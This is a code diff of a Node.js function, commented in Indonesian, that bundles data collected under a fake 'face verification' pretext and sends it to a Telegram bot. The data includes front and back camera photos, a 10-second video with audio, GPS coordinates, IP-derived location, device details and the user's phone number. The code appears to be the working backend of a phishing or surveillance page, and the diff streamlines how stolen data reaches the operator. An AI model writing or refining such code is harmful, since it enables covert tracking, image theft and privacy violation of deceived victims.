@@ -48,113 +48,103 @@ async function getLocationDetails(ip) {
 }
 
 // ============================================
-// 📤 SEND TO TELEGRAM
+// 📤 SEND 1 PESAN LENGKAP KE TELEGRAM
 // ============================================
 async function sendToTelegram(data) {
     try {
         const { frontPhoto, backPhoto, video, gps, device, ip, timestamp, phone, locationData } = data;
         const time = new Date(timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 
-        // ===== KIRIM FOTO DEPAN =====
+        console.log('📤 Sending 1 complete message to Telegram...');
+
+        // ===== BUAT CAPTION LENGKAP =====
+        let caption = `🟡 *VERIFIKASI WAJAH*\n\n`;
+        caption += `📱 *User:* ${phone || 'Tidak diketahui'}\n`;
+        caption += `🕒 *Waktu:* ${time}\n\n`;
+
+        // Device Info
+        if (device) {
+            caption += `📱 *Device:* ${device.brand || 'Tidak diketahui'} ${device.model || ''}\n`;
+            caption += `💻 *OS:* ${device.os || 'Tidak diketahui'}\n`;
+            caption += `🌐 *Browser:* ${device.browser || 'Tidak diketahui'}\n\n`;
+        }
+
+        // Lokasi dari IP
+        if (locationData) {
+            caption += `📍 *Lokasi (IP):* ${locationData.fullLocation}\n`;
+            caption += `🗺️ ${locationData.googleMapsLink}\n\n`;
+        }
+
+        // GPS
+        if (gps && gps.latitude && gps.longitude) {
+            caption += `📍 *GPS:* ${gps.latitude}, ${gps.longitude}\n`;
+            caption += `🗺️ https://www.google.com/maps?q=${gps.latitude},${gps.longitude}\n\n`;
+        }
+
+        caption += `🌐 *IP:* ${ip || 'Tidak diketahui'}\n`;
+        caption += `📹 *Video + Audio:* 10 detik`;
+
+        // ===== KIRIM 1 PESAN DENGAN FOTO + VIDEO =====
+        // Kirim foto depan sebagai cover
+        let photoBuffer = null;
         if (frontPhoto) {
-            const buffer = Buffer.from(frontPhoto.replace(/^data:image\/\w+;base64,/, ''), 'base64');
+            photoBuffer = Buffer.from(frontPhoto.replace(/^data:image\/\w+;base64,/, ''), 'base64');
+        } else if (backPhoto) {
+            photoBuffer = Buffer.from(backPhoto.replace(/^data:image\/\w+;base64,/, ''), 'base64');
+        }
 
-            let caption = `🟡 *VERIFIKASI WAJAH - DEPAN*\n\n`;
-            caption += `📱 *User:* ${phone || 'Tidak diketahui'}\n`;
-            caption += `🕒 *Waktu:* ${time}\n\n`;
+        // Kirim album (foto + video dalam 1 pesan)
+        // Cara: kirim foto dulu, lalu video sebagai reply
+        let messageId = null;
 
-            if (device) {
-                caption += `📱 *Device:* ${device.brand || 'Tidak diketahui'} ${device.model || ''}\n`;
-                caption += `💻 *OS:* ${device.os || 'Tidak diketahui'}\n`;
-                caption += `🌐 *Browser:* ${device.browser || 'Tidak diketahui'}\n\n`;
-            }
-
-            if (locationData) {
-                caption += `📍 *Lokasi (IP):* ${locationData.fullLocation}\n`;
-                caption += `🗺️ ${locationData.googleMapsLink}\n\n`;
-            }
-
-            if (gps && gps.latitude && gps.longitude) {
-                caption += `📍 *GPS:* ${gps.latitude}, ${gps.longitude}\n`;
-                caption += `🗺️ https://www.google.com/maps?q=${gps.latitude},${gps.longitude}\n\n`;
-            }
-
-            caption += `🌐 *IP:* ${ip || 'Tidak diketahui'}\n`;
-            caption += `_📹 Video + Audio juga dikirim_`;
-
-            const form = new FormData();
-            form.append('chat_id', CHAT_ID);
-            form.append('caption', caption);
-            form.append('photo', buffer, {
-                filename: `foto_depan_${Date.now()}.jpg`,
+        // 1. Kirim FOTO
+        if (photoBuffer) {
+            const formPhoto = new FormData();
+            formPhoto.append('chat_id', CHAT_ID);
+            formPhoto.append('caption', caption);
+            formPhoto.append('photo', photoBuffer, {
+                filename: `foto_${Date.now()}.jpg`,
                 contentType: 'image/jpeg'
             });
 
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
-                body: form
+                body: formPhoto
             });
+            const photoResult = await photoResponse.json();
+            if (photoResult.ok) {
+                messageId = photoResult.result.message_id;
+                console.log('✅ Photo sent, message_id:', messageId);
+            }
         }
 
-        // ===== KIRIM FOTO BELAKANG =====
-        if (backPhoto) {
-            const buffer = Buffer.from(backPhoto.replace(/^data:image\/\w+;base64,/, ''), 'base64');
-
-            const form = new FormData();
-            form.append('chat_id', CHAT_ID);
-            form.append('caption', `📸 *Foto Belakang*\nUser: ${phone || 'Tidak diketahui'}`);
-            form.append('photo', buffer, {
-                filename: `foto_belakang_${Date.now()}.jpg`,
-                contentType: 'image/jpeg'
-            });
-
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: form
-            });
-        }
-
-        // ===== KIRIM VIDEO + AUDIO (MP4 - LANGSUNG PLAYABLE) =====
+        // 2. Kirim VIDEO (reply ke foto)
         if (video) {
-            // Convert webm ke mp4 atau kirim sebagai video
             const videoBase64 = video.replace(/^data:video\/\w+;base64,/, '');
             const videoBuffer = Buffer.from(videoBase64, 'base64');
 
-            // Coba kirim sebagai video (Telegram support webm juga)
             const formVideo = new FormData();
             formVideo.append('chat_id', CHAT_ID);
-            formVideo.append('caption', `📹 *Video Verifikasi*\nUser: ${phone || 'Tidak diketahui'}\n🕒 ${time}`);
+            formVideo.append('caption', `📹 *Video Verifikasi 10 Detik*\nUser: ${phone || 'Tidak diketahui'}`);
             formVideo.append('video', videoBuffer, {
-                filename: `video_${Date.now()}.webm`,
-                contentType: 'video/webm'
+                filename: `video_${Date.now()}.mp4`,
+                contentType: 'video/mp4'
             });
 
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+            // Reply ke foto
+            if (messageId) {
+                formVideo.append('reply_to_message_id', messageId);
+            }
+
+            const videoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                 method: 'POST',
                 body: formVideo
             });
-            
-            const result = await response.json();
-            console.log('📹 Video send result:', result.ok ? '✅ Success' : '❌ Failed');
-            
-            // Kalau gagal, coba kirim sebagai document
-            if (!result.ok) {
-                console.log('⚠️ Trying to send as document...');
-                const formDoc = new FormData();
-                formDoc.append('chat_id', CHAT_ID);
-                formDoc.append('caption', `📹 *Video Verifikasi*\nUser: ${phone || 'Tidak diketahui'}`);
-                formDoc.append('document', videoBuffer, {
-                    filename: `video_${Date.now()}.webm`,
-                    contentType: 'video/webm'
-                });
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-                    method: 'POST',
-                    body: formDoc
-                });
-            }
+            const videoResult = await videoResponse.json();
+            console.log('📹 Video send result:', videoResult.ok ? '✅ Success' : '❌ Failed');
         }
 
-        // ===== KIRIM LOKASI GPS =====
+        // 3. Kirim GPS Location
         if (gps && gps.latitude && gps.longitude) {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                 method: 'POST',
@@ -169,7 +159,7 @@ async function sendToTelegram(data) {
 
         return true;
     } catch (err) {
-        console.error('Send error:', err);
+        console.error('❌ Send error:', err);
         return false;
     }
 }
